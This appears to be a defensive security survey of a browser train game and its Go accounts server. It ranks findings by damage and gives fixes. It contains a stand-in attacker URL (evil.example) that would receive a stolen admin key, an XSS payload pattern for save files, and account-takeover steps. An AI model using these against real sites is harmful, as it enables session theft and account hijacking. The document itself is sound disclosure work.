# T-2912 Security survey: trainsworld and shonei-server

Done 2026-11-09, read-only. Server copy reviewed at `af3309c`. No production request beyond a normal page load.
Probes ran against a scratch copy of the server and in a throwaway headless profile with a dummy key, on
localhost. No fixes made: this file is the list.

Bottom line: no route lets one player read or change another's game, feedback or email. A player's
account falls only through something that gets script onto anita.garden. The two ways to that are items 1 and 3.

## Findings, most damaging first

### 1. Third-party scripts share the origin that holds every session (confirmed)

- **What the attacker does:** gets altered code served by unpkg, jsDelivr, cdnjs or Google Tag Manager.
- **What they get:** every signed-in player who opens any of those pages. The session lives in `localStorage`
  under `noritetsu.auth.v1`, readable from every page on anita.garden. With it they read `/noritetsu/me`
  (recovery email), download or delete all the games, and take the account (item 4).
- **Where:** 19 pages load scripts from those CDNs, among them `website/noritetsu/index.html:509-510`,
  `website/assets/citycircles.html:299`, `website/assets/guessthecity.html:364`, the `_layouts/*map.html` panzoom,
  `website/trackdepth/index.html:213` (Cesium). `website/_includes/analytics.html:27` is on 15. `integrity=` appears nowhere
  in the repo. Versions are pinned exactly, which stops an npm republish but not a change at the CDN.
- **How likely:** low, but it is the largest blast radius here. CDN compromises have happened (polyfill.io, 2024).
- **Smallest fix:** add `integrity="sha384-..." crossorigin="anonymous"` to each CDN tag. Gtag can't take a
  hash; leave it, or take it off the pages that use the account (noritetsu).
- **Bigger fix, later:** move accounts and the game to their own origin (say `play.anita.garden`), so the rest of the
  site can't touch the session.

The published game page itself is clean: no external script, no source maps, in `website/trainsworld/`.

### 2. The admin key goes to any server named in the URL (confirmed in a browser)

- **What the attacker does:** gets Anita to open `http://localhost:8800/twfeedback/?server=https://evil.example/`
  while serve.py runs: a link in a mail, chat or feedback message, or any web page she visits opening that URL in a popup.
  The page starts by itself and sends `Authorization: Bearer <stored key>` to that server. Same on `/twstats/`.
- **What they get:** the feedback admin key, which is every thread with its contact email and browser details, replying as Anita,
  deleting all feedback, removing or banning Community shares, and the stats. It does not open player accounts or games.
- **Where:** `trainworld/tools/feedback-inbox/index.html:91`, `trainworld/tools/analytics/index.html:125`.
- **How likely:** low to moderate; it takes aim at her in particular, but one click is enough.
- **Smallest fix:** accept `?server=` only for `http://127.0.0.1:` and `http://localhost:` (two lines).
- **Related (confirmed):** the key sits in `localStorage` of `localhost:8800`, one origin for every map there, so any map's
  scripts can read it. `twstats` itself loads maplibre from unpkg (`analytics/index.html:121`). Fix: give the key pages a
  port of their own (their own origin), or keep the key in `sessionStorage`; drop the CDN script from `twstats`.

### 3. A hostile save runs script when its trip marker is hovered (confirmed by reading, not run in a browser)

- **What the attacker does:** shares a `.save` file with a station named `<img src=x onerror=...>`. The player imports it (the
  start menu and Saves panel both offer this) and looks at a trip from that station.
- **What they get:** script on anita.garden, so the session and item 4.
- **The chain:** `map/tripView.ts:295` puts `stationName(st)` through `tr("tripView.startsAt", {name})`; `i18n/index.ts:49`
  compiles with `ignoreTag`, so values are not escaped; `map/demandHover.ts:123-125` builds a string and sets `tag.innerHTML`.
  `tripView.ts:639` and `:650` (station and line names in stop and walk tips) feed the same sink.
  `map/attractionMarks.ts:188` escapes its names and shows the fix; the other finders only carry numbers, zone names and pack data.
- **How likely:** low today, it needs a shared file and one hover. **Stage 3 of Community ("let people open a copy") makes
  it one click for anyone,** so this must be closed before that ships.
- **Smallest fix:** in `demandHover.ts`, build each line with `textContent`; a finder that really wants markup says so
  (`modeBar` and the `<div` lines). Then also add
  `<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'wasm-unsafe-eval' https://accounts.google.com">`
  to the game's `index.html` (test it with the workers), which stops injected `onerror` code in the game page on its own.
- **Also from hostile saves:** `saveFile.ts:272` unpacks with no size limit, so a gzip bomb crashes the importing tab.
  Tab only, the player's own file. No script path into the Rust WASM decoders was found; they were read at the surface only
  and not fuzzed.

### 4. A stolen session is enough to take the account for good (confirmed by test)

- **What the attacker does:** with a token (from 1 or 3), `PUT /noritetsu/email` sets their own address with no password asked;
  they click the confirm link; `/noritetsu/forgot` mails them a reset. Or `DELETE /noritetsu/account` straight away. Tested end to end
  on the scratch copy.
- **What they get:** the account, locked away from its owner, or wiped (recoverable from the 7-day Hetzner backups only).
  Sign-out-everywhere does not help after the password changes.
- **Where:** `noritetsu_password.go:394-456` (email), `noritetsu.go:891` (delete). The comment at `noritetsu_password.go:328-330`
  promises a stolen token can't lock the owner out; email change gets around it. Tokens last 60 days and refresh on every load.
- **How likely:** only after a token leak.
- **Smallest fix:** ask for the current password on email change or removal and on delete; mail the old address when it changes.

### 5. Live Google API key in the public maps repo (confirmed)

- `maps/favorites/meow.py:9`, `favorites/test_placeid.py:7`, `favorites/debug_response.html:1`, still in HEAD, since commit `6117dd20` (2026-03-30).
- Anyone can spend Google quota on that account. No player harm; a bill, depending on what the key may call.
- Fix: delete or restrict the key in Google Cloud, then remove the files. Revoking it makes history harmless, no rewrite needed.

### 6. The server starts wide open if the secret line is missing (suspected: production not checked)

- `auth.go:121` falls back to a fixed key from the source when `SHONEI_SECRET` is unset, so every token can be forged; with the Google
  client id missing as well, `noritetsu.go:241` also turns on dev sign-in (any made-up id). The systemd unit requires the env FILE only (`deploy/shonei.service:18`), so a file with the line lost starts in this
  mode with all tokens forgeable. Open-sourcing would publish that constant too.
- Fix: refuse to start unless the secret is set or an explicit `SHONEI_DEV=1` is. One `log.Fatal`.

### 7. Go runtime is behind on security fixes (confirmed locally)

- Local Go is 1.26.0; `go.mod` says 1.25. `govulncheck` reports 37 standard-library issues, 28 reachable from the server, fixed by 1.26.9:
  `net/http` crash and memory bugs, `html/template` escaping bugs (`recovery.go:697`), `os.Root`. Most are crash or memory
  exhaustion; the template ones matter least since nothing user-controlled reaches a script context there.
- The deployed binary's Go version was not checked. Fix: update Go and redeploy. Full list: `C:\Users\anita\AppData\Local\Temp\claude\dce1fefcc1d43aef\3415d22e-522e-4ce0-ad47-92ca99b058bf\scratchpad\security\govuln.txt`.

### 8. Community griefing (confirmed by test)

- Three brand-new accounts can hide any share at once: `handleCommunityReport` (`trainworld_community.go:1482`) has no 60-minute gate, unlike sharing and liking.
  Damage is small, the inbox has Keep. Fix: the same `accountPlayedEnough` check.
- **Rule for the game side, which is not written yet** (`.tw-trees/communitygame` has no changes): display names and station names reach the client with `<` intact (tested:
  `<img ...>` is kept by both `sanitiseName` and `twCleanStationName`). The painter must draw them as text; any hover must go through item 3's fix.

### 9. Smaller things

- `noritetsu_password.go:264` answers `email_taken`, so an address can be tested for an account at 5 tries an hour per IP. `/forgot`'s careful identical answer doesn't cover that. Accept it, or make register always succeed.
- `main.go:32` runs `http.ListenAndServe` with no timeouts; slow connections through Caddy tie up memory. Fix: `http.Server` with `ReadHeaderTimeout`.
- The 2,000 account cap can be filled (100 sign-ups an hour across everyone), which closes sign-ups. An alert fires at 1,000.
- `ratelimit.go:121` trusts the first `X-Forwarded-For`. Safe only if Caddy replaces what clients send, the default since Caddy 2.5. Box version not checked.
- With `RESEND_API_KEY` unset, `email.go:140` logs mail bodies including reset links. Only matters if the key is ever dropped on the box.
- `website/trainsworld/frozen.json` publishes a local Windows path. Harmless.
- `maps/trainworld/tools/aws/awslib.py:20` publishes the friend's AWS account number, in a public repo. Not a credential, worth knowing.

## Secrets

Scanned every commit of maps (1,425), website (385) and shonei-server (84) for AWS, GitHub, Resend, Anthropic, Google, R2, webhook, private-key, bearer and assignment-shaped secrets; script
`scan_secrets.py` printed rule, commit and path only.

- **shonei-server (private):** clean. `shonei.env`, `accounts.json`, `feedback/`, `noritetsu/` and `trainworld/` are gitignored and were never added. Open-sourcing is safe from the secrets side apart from item 6's constant.
- **maps (public):** the key in item 5. No AWS, R2, Resend or OAuth secret.
- **website (public):** jsonbin master key in 5 old commits (`1b1091e`, `a1c8a97`, `759b214`, `fd6eb0c`, `fb9388d`, Feb-Mar 2026). `deploy/README.md` planned to delete the bins and rotate it. **Check that happened.**
- **Limit:** history lines over 4,000 characters were skipped, so a secret inside old minified bundles would not show. The current published game bundle was grepped separately: clean.

## Checked and found sound

- **Google sign-in** (`noritetsu_google.go`): RS256 only, key from Google, issuer, audience, expiry and sub all checked; the email is never read.
- **Tokens:** HMAC with a derived key; forged ids, confirm tokens used as sessions and tokens after sign-out-everywhere are all refused (tested).
- **One account against another's games:** read, picture, backups, overwrite (even forced) and delete all stay in the caller's folder (tested). Feedback threads and shares check the owner.
- **Traversal:** ids are regex-bound before any path; none of seven attempts answered 200 (tested).
- **CORS:** no credentials, fixed allowlist.
- **Feedback inbox rendering:** `textContent` throughout. City Circles, Guess the City and the agents page escape names. No `dangerouslySetInnerHTML` in the game; Preact escapes the rest.
- **noritetsu share views:** whitelisted fields server-side; a hostile `#s=` link ran no script. Its rows did not render in that probe, so the rows' code was read by hand, not fuzzed.
- **Community uploads:** 2 GB gzip bomb refused in 6 ms (tested); upload is parsed into structs and re-encoded; deletes and bans remove what they should.
- **Size limits:** every body read goes through `MaxBytesReader`; budgets exist per account and for the store.
- **Personal data:** no route gives one player another's email. Logs mask addresses. Feedback keeps the IP (`trainworld_feedback.go:570`), which the privacy page states.
- **Deletion:** account delete takes games, scores, threads, shares, likes, reports, playtime; backups last 7 days, as the privacy page says.
- **Supply chain:** `go.sum` and `package-lock.json` pin everything; `npm audit` finds none in production dependencies. Service runs as non-root with `ProtectSystem=strict`, bound to 127.0.0.1.

## Not checked

- The production box: firewall, open ports, Caddy version, the real `shonei.env` and its permissions, SSH config, deployed binary's Go version.
- Cloudflare R2 bucket permissions, Hetzner console, Resend, Google Cloud console (authorised origins include `http://localhost` per `deploy/README.md:365`).
- A browser run of item 3 (the chain is read, not exploited).
- The Unity Shonei client, and Shonei's own routes beyond a skim: same process, separate accounts.
- Fuzzing of the Rust/WASM save decoders.
- Script injection on the static map pages that don't call the server.
